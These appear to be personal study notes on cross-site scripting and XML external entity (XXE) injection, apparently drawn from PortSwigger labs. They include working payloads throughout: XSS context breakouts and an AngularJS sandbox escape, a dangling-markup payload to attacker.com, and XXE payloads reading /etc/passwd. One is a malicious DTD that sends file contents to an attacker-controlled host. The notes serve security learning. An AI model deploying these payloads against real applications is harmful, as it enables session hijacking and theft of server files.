# Cross Site Scripting
![](https://github.com/DK9510/Img/blob/main/xss.png)

## what is Cross site Scripting 
- it is web security vulnerability that allows an attacker to compromise the interactions that user have with a vulnerable application.
- it allow an attacker to masquerade as victim user, to carry any action that user is able to perform.

## Types of XSS 
- `Reflected XSS:` where the malicious scrip comes from the current HTTP request.
- `Stored XSS: ` where the malicious script comes from the website's database.
- `DOM-Based XSS:` where the vulnerability exists in the client-side code rather than server-side code.

# Reflected XSS
- it arise when an application receives data in an HTTP request and include data within the immediate response in an unsafe way.
```js
http://insecure.web/status?msg=hello.
```
```js
http://insecure.web/status?msg=<script>bad stuff </script>
```
[Ultimate XSS Cheetsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## impact of Reflected xss 
- perform any action within the application that the user can perform
- view any information that the user is able to view
- modify any information that the user is able to modify
- initiate interaction with other application users, including malicious attacks

# exploiting
- traditional way to prove that you've found XSS in to create popup using `alert()` function. but xss is not only popups
- xss can be leverage to higher criticality if we craft spacial payload that more harmfull.

## Exploiting XSS to steal COOKIES
#### limitation
- victim might not logged in
- many application hide their cookie from JS using `HttpOnly` flag
- sessions might be locked to additional factors like the user's IP address
- the Session might time out before you're able to hijack it.

we make xxs to request to our domain+with cookie `document.cookie` there is many ways this can be done

## EXploiting XSS to perform CSRF
it is depend on the application type and what a user can do, probably we do all that stuff with out user interaction using `jS`
## capture password
- some user use autofill password we take advantage of that feature and make xss trigger to auto fill the password in the attacker web and submit that to attacker web

# find and test for Reflected XSS
- **Test Every Entry Point:** test separately every entry point for data within the application's HTTP requests. This include parameter or other data within the URL query string and message body.
- Determine the Reflection context i.e where is our input reflected.
- test Candidate payload: using burp repeater we see if our payload work or not
- test alternative payload if the XSS payload was blocked or modified by the application.
- test the attack in a real browser and confirm it.

# XSS COntext
- the location where the response where the attacker control data appears.
- any input validation or other processing that is being performed on that data by application.

## XSS in HTML tag attributes
- When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:
```js
"><script>alert(document.domain)</script>"
```
- if angle brackets are blocked then we introduce new attributes that creates a scriptable context, such as event handler
```js
"autofocus onfocus=alert(document.domain) x="
```

- Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. Here, you can execute JavaScript without needing to terminate the attribute value. For example, if the XSS context is into the `href` attribute of an anchor tag, you can use the `javascript` pseudo-protocol to execute script. For example:
```js
< a href="javascript:alert(document.domain)">
```

## Xss into Java script
- simply close the previous `<script>` tag and then enter our payload
```js
</script><img src=x onerror=alert(document.domain)>
```

## breaking out of a java script string
- in cases where the Xss context is inside a quoted string literal, it is often possible to break out of the string and execute java script directly. 
- it is essential to repair script following xss context, because any syntax errors there will prevent the whole script from executing.
```js
'-alert(document.domain)-'    or
';alert(document.domain)//
```

- Some applications attempt to prevent input from breaking out of the JavaScript string by escaping any single quote characters with a backslash
-  backslash before a character tells the JavaScript parser that the character should be interpreted literally, and not as a special character such as a string terminator.
-  In this situation, applications often make the mistake of failing to escape the backslash character itself. This means that an attacker can use their own backslash character to neutralize the backslash that is added by the application.
```js
';alert(0)//   gets covers to \';alert(0)//
we use
\';alert(0)// which converted to \\';alert(0)//
here 1st '\'bypass 2 nd '\' from interpreting as special char
```

## making use of HTML Encoding
- when the XSS context is some existing javascript within quoted tag attribute, such as an event handler, it is possible to make use of `HTML Encoding` to work around some input filters.
- if sever-side application blocks or sanitize certain character that need for sucessfull XSS exploit, we bypass it using `HTML-Encoding` those characters.
```js
<a href="#" onclick="... var input='controble data here';...">
```
if application blocks or escape `Quote` character we use this 
```js
&apos;-alert(document.domain)-&apos;
```

## XSS in Java Script Template literals
- javascript template literals are string literals that allow embedded javascript expressions.
- the embedded expression are evaluated and are normally concatenated into the surrounding text. template literals are encapsulated in backticks instead of normal quotation ,marks.
- `${...}syntax`
- example following script will print whole msg that includes user's name
```js
document.getElementById('message').innerText=`Welcom, $(user.displayName).`;
```
 to exploit this jS template literal
 ```js
 <script>
 ...
 var input=`controllable data`;
 ...
 <script>
 <!-- we use payload like bellow to trigger XSS-->
 ${alert(document.domain)}
 ```
 
 ## Xss in the Context of the angular JS sandbox
 ```js
 1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
 ```
 
 # Stored XSS
 - also known as second order Xss 
 - arise when an application receives data from an untrusted source and includes that data within its late HTTP response in an unsafe way
 example
 ```js
 <p>hello, tnis is my message </p>
 exploit
 <p><script>js script </script></p>
 ```
 
 ## find and test for Stored XSS
 - parameter or other data within the URL query string and message body
 - The URL path
 - http header that might not be exploitable in relation to reflected xss
 - Data that is currently stored by the application is often vulnerable to being overwritten due to other actions performed within the application. For example, a search function might display a list of recent searches, which are quickly replaced as users perform other searches

# DOM-based XSS
- DOM-based XSS (also known as DOM XSS) arises when an application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM.
## Which sinks can lead to DOM-XSS vulnerabilities?

The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:

`document.write()  
document.writeln()  
document.domain  
someDOMElement.innerHTML  
someDOMElement.outerHTML  
someDOMElement.insertAdjacentHTML  
someDOMElement.onevent  
`

The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:

`add()  
after()  
append()  
animate()  
insertAfter()  
insertBefore()  
before()  
html()  
prepend()  
replaceAll()  
replaceWith()  
wrap()  
wrapInner()  
wrapAll()  
has()  
constructor()  
init()  
index()  
jQuery.parseHTML()  
$.parseHTML()`

# COntent Security Policy
## what is CSP
- CSP is a browser security mechanism that aims to mitigate XSS and some other attacks. 
- it works by restricting the resources(i.e scripts and images)
- TO enable `CSP` a response needs to include HTTP response header called `Contet-Security-Policy` with value containing the policy. the policy consists of one or more directive, separated by semicolons.

## mitigating XSS attack using CSP
`CSRF+ XSS` example:
[lab scenario](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-with-dangling-markup-attack)


# Dangling Markup Injection
## what is Dangling Markup Injection
- it is a technique for capturing data cross-domain in situation where a full XSS attack isn't possible.
- if normal Xss isn't possible due to input filters or CSP or other Obstacles here it might still be possible to deliver a `dangling markup injection` attack using a payload like the following
```js
"><img src='//attacker.com?
```
This payload creates an `img` tag and defines the start of a `src` attribute containing a URL on the attacker's server. Note that the attacker's payload doesn't close the `src` attribute, which is left "dangling". When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute. Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string. Any non-alphanumeric characters, including newlines, will be URL-encoded.
- The consequence of the attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data. Depending on the application's functionality, this might include CSRF tokens, email messages, or financial data.
`Example labs `
[lab1](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)
[lab2](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-with-dangling-markup-attack)

# [prevention](https://portswigger.net/web-security/cross-site-scripting/preventing)
## what is XML external Entity Injection.
- it is also known as `XXE` is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. 
- it allows attacker to view files on the application server and to interact with any back-end system that the application it self have access.
- some times attacker leverage `XXE ` to `SSRF` attacks

## How does XXE vulnerabilities arise
- some application use XML format to transmit data between the browser and the server.
- it use standard library or platform API to process the `XML` data on the server.
- `XXE ` arise because the XML specification contains various Potential Dangerous features, and Standard parsers support these feature even if they are not normally used by the application.

# XML entities
## what is XML
- XML stands for `Extensible Markup Language`.
- it is designed for storing and transporting data.
- XML is also uses tree-like structure as HTML uses
- but in XML does not use predefined tags, so tags given name according to user or data.
- it is popular in earlier but now days `JSON` format has widely accepted.

## what are XML Entities
- it is an way of representing an item of data within an XML document.
- various entities are built in to the specification of the XML language.
- example: `&lt; and &gt;` represent the characters `< and >`, these meta characters using to denote `XML tags`, so must generally be represented using their entities when they appear with data.

## what is Document Type Definition.
- XML Document Type Definition`(DTD)` contains declaration that can define the structure of an XML document, the types of data values it contain. and other Items.
- `DTD` is declared with the optional `DOCTYPE` element at the start of the XML document.
- The DTD can be fully self-contained within the document it self( known as `internal DTD` ) or can be loaded from elsewhere (known as `External DTD`) or can by Hybrid of two.

## what are custom Entities
example:
```js
<!DOCTYPE name [<!ENTITY entity_name "entity value" > ] >
```
- in this definition means that any uses of the entity reference `&entity_name;` within the XML document will be replaced by the value of that entity i.e `"entity value"`.

## XML External Entities
- xml external entities are a type of custom entity whose definition is located outside of the `DTD` where they are declared.
- the declaration of an external entity used the `SYSTEM` keyword and must specify a URL which the value of the entity should be loaded.
- **Example:**
```js
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "https://web-dev.com" > ]>
```
we change https protocol to file

```js
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" >]>
```
here we have an `LFI` vulnerability.

# XXE vulnerability and exploitation

## What are types of XXE attack
- **Exploiting XXE to retrieve files:** where an external entity is defining the contents of the file, and returned in the application's response.
- **Exploiting XXE to perform SSRF attack:** where an external entity is defined based on a URL to a back-end system.
- **Exploiting Blind XXE exfiltrate data out-of-band:** where sensitive data is transmitted from the application server to a system that the attacker controls
- **EXploiting Blind XXE to Retrieve data via error messages:** where the attacker can trigger a parsing error message containing sensitive data.

## Exploiting XXE to Retrieve Files.
- to perform XXE injection that retrieve file from the server , we need to modify the XML in two ways
	1. introduce or edit `DOCTYPE` element that defines an external entity containing the path to the file.
	2. Edit a data values in the XML that is returned in the application's response, to make use of defined external entities.
- example: shopping application check stock by submitting XML to the server
```js
<?XML version="1.0" encoding="UTF-8"?>
<stockcheck><productId>381</productId></stockcheck>
```
- since the application didn't use any defense mechanism against XXE we exploit it and retrieve any file from server.
`exploit/ payload`
```js
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file://etc/passwd" >]>
<stockcheck><productId>&xxe;</productId></stockcheck>
```

- here payload defines an external entity `&xxe;` whose value is `content of /etc/passwd` and uses the entity within the `productId` value, this cause application's response to induce the contents of the file.
- **Note:** ``With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application's response. To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response.``

## EXPLOITING XXE to perform SSRF
- aside from retrieving data other main impact of `XXE` is , it can be used to perform `SSRF`. 
- for exploiting `XXE to SSRF` we need to define external entity using the URL that we want to target.
- for doing two way interaction we need to put `ENTITY ` in defined entity that returned in the application's response with out it will `Blind SSRF` but it also critical vuln.

```js
<!DOCTYPE root [ <!ENTITY DK SYSTEM "http://internal.domain/" > ]>
```

# Finding and EXploiting Blind XXE Vulnerabilities

## What is Blind XXE
- `BLIND XXE` vulnerabilities arises where the application is vulnerable to `XXE injection` but does not return the values of any defined external entities with in its responses. 
- i.e direct retrieval of the server-side files is not possible, and `blind xxe is harder than regular xxe`
- `How to exploit Blind XXE` 
	- trigger out-of-band network interaction.
	- trigger XML parsing errors in such a way that the error messages contain sensitive data.

## Detecting Blind XXE using Out-of-band (OAST)
- we need to define an external entity for triggering network interaction to our server.
```js
<!DOCTYPE root [<!ENTITY DK SYSTEM "http://data.ourdomain.com" >]>
```
and use it to valid defined entity in the data value in the `XML`

- sometimes `XXE attacks` using regular Entities are Blocked, due to some input validation by the application or some hardening of the XML parser that is being used.
- in this situation you might be able to use `XML parameter Entities` , it is special kind of Entities which can only be referenced elsewhere within the `DTD` 
- for this we only need 2 things
	1. declaration of an XML parameter entity include the `%` symbol before the entity name `` <!ENTITY % myparameter_entity "parameter value"> ``
	2. parameter Entities are referenced using the `%` character instead of usual `&` character: ``%myparameter_entity``
``Final Payload for XXE Blind using Parameter Entity payload``
```js
<!DOCTYPE root [<!ENTITY % DK SYSTEM "http://attacker.domain"> %DK; ]> 
```

## Exploit Blind XXE to Exfiltrate data out-of-band (OAST)
- detecting vulnerability via out-of-band technique is well but exploitation to exfiltrate data via this is not easy.
- This can be achieved via a blind XXE vulnerability, but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.
- **Example of malicious DTD** 
```js
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval " <!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com or we use burp collaborator/?x=%file;'> ">
%eval;
%exfiltrate
```
This `DTD` carries out the following steps
- defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd ` file.
- Defines an XML parameter entity called `eval` containing a dynamic declaration of another XML parameter entity called `exfiltrate`. 
- this exfiltrate entity will be evaluated by making HTTP request to the attacker's control web server containing the value of the `%file` entity to url query string.
- uses `eval` entity, which causes the dynamic declaration of the `exfiltrate` entity to be performed.
- uses the `exfiltrate` entity, so that its value is evaluated by requesting the specified URL.
- the attacker must host this malicious `DTD` file in to his server `http://attacker.domain/malicious.dtd`
- and finally attacker need to submit the payload to the `xxe vuln` application.
```js
<!DOCTYPE root [<!ENTITY % dk SYSTEM "http://attacker.domain/malicious.dtd"> %dk; ]>
```

## Exploiting XXE to retrieve data via error messages.
- alternative approach to exploiting `blind XXE` is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve.
- this will be effective if the application returns the resulting error message within its response.
```js
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
this DTD carries out the following
1. Defines an XML Parameter entity called `file`, containing the contents of the `/etc/passwd` file.
2. defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `error` . the error entity will be evaluated by loading a nonexistent file whose name contains the value of the file entity.
3. Uses the eval entity which causes declaration of the error entity to be performed.
4. uses the error entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the `/etc/passwd` file.
5. for exploitation put that `malicious.dtd` file to exploit server and then request to that file using `XXE injection ` and it gives error with output of `%file` entity.
invoking malicious `external DTD` will result in an error message containing the contents of the file /etc/passwd

## Exploiting Blind XXE by repurposing a local DTD
- preceding technique works fine with external DTD but normally won't work with internal DTD, 
- what to do if in blind xxe the out-of-band intraction is blocked and we cant load from the `External DTD`  from the remote location. 
- in this situation, trigger error message containing sensitive data, due to loophole in XML language specification. 
- if document's DTD uses `hybrid` of internal and external DTD declaration, then the internal DTD can reduce entities that are declared in the external DTD. 
- when this happens, the restriction on using an XML parameter entity within the definition of another parameter entity is relaxed.
- [full-explain-this attack](https://portswigger.net/web-security/xxe/blind)
**Example** if DTD file on the server at location /usr/local/app/schema.dtd, and it defines entity called `custom_entity `, an attacker can trigger an XML parsing error message containing contents of /etc/passwd by submitting `Hybrid DTD`
```js
<!DOCTYPE root [<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY $ custom_entity '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27; file:///invalid/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;'>
%local_dtd;
]>
```

## locating an Existing DTD file to repurpose.
- since this XXE attack involves repurposing an `existing DTD` on the server filesystem.
- a key requirement is to locate a suitable file. it is quite easy since server throws an error message thrown by the XML parser.
- example: in linux DTS file at `/usr/share/yelp/dtd/docbookx.dtd`

```js
<!DOCTYPE root [<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"
%local_dtd;]>
```
# Finding hidden Surface for XXE injection vulnerability 
- attack surface for XXE injection vulnerability is obvious in many cases, because the application's normal http traffic includes request that contain data in XML format
- in other case attack surface is less visible, if we look at the right place, we find XXE attack surface in requests that do not contain any XML.

## XInclude Attacks
- application receive client-submitted data, embed it on the server-side into an  XML document, and then parse the document, 
- an example this occurs when client-submitted data is placed into a back-end `SOAP request`, which is then processed by the back-end SOAP service.
- in this situation, you cannot carry out a classic XXE attack, because we can not control entire XML document and so can not define or modify a `DOCTYPE` element.
- but we might able to use `XInclude` instead.
- `Xinclude` is part of XML specification that allows an XML document to be built from sub-documents. we place an `XInclude` attack with any data value in an XML document, so the attack can be performed in situation where you only control a single item of data that is placed into a server-side XML document.
- to performs an `XInclude` attack you need to reference the Xinclude namespace and provide the path to the file that you wish to include for example:
```js
<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>
```

## XXE attacks via File upload
- some applications allow users to upload files which are then processed server-side.
- some common file formats use XML or Contains XML sub-components.
- Example: XML based formats are office documents like `DOCX` and image formats like `SVG`
- for example: application might allow user to upload images, and process or validate these on the server after they are uploaded. 
- even if the application expects to receive a format like `PNG or JPEG` the Image processing library that is being used might support `SVG` images, since the SVG format uses `XML`. an attacker can submit a `malicious SVG` image and so read hidden attack surface for XXE vulnerabilities.
**EXploit :**
```bash
<?xml version="1.0" standalone="yes"?><!DOCTYPE test \[ <!ENTITY xxe SYSTEM "file:///etc/hostname" > \]><svg w  
idth="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" vers  
ion="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
**request looks like this**
```js
Content-Disposition: form-data; name="avatar"; filename="exploit.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="yes"?><!DOCTYPE root [<!ENTITY dk SYSTEM "file:///etc/hostname"> ]><svg width="128px" height="128px" xmlns="http://www.w3.org./2000/svg" xmlns:xlink="http://www.w3.org/1999/Xlink" version="1.1"><text font-size="16" x="0" y="16">&dk;</text></svg>
```

## XXE via Modified Content Type
- most `POST` request use a default content-type that has generated by HTML Forms such as `application/x-www-form-urlencoded` 
- some server expect to receive request in this format but this format will be tolerate other content types, including XML
```js
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

parameter=value
```
we will tolerate this request and convert this content type into XML
```js
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 63 {here we need to put length of our payload i.e charector length of xml DTD}

<?xml version="1.0" encoding="UTF-8"?><parameter>value</parameter>
```
- if application tolerates request containing XML in the message Body and parse the body content as XML, then you reach the `hidden XXE` attack surface simply by reformating request to use the XML format.

# How to find and test for XXE vulnerability 
- Testing for `file retrievel ` by defining an external entity based on a well-known operation system file  and using that entity in data that is returned in the application's response.
- Testing for `Blind XXE vuln` by defining an external Entity based on a URL to a system that you control, and  monitoring for interaction with that system.
- Testing for vulnerability inclusion of user-supplied non-XML data within a server-side XML document by using an `XInclude attack` to try to retrieve a well-known operation system file.

# How to prevent XXE vulnerabilities from Occur.
- all the major XXE vulnerabilities arise because the application's XML parsing library supports potential dangerous XML features that the application does not need of intend to use.
- The easiest and most effective way to prevent XXE attack is to disable those features.
- disable resolution of external entities and disable support for `XInclude`.


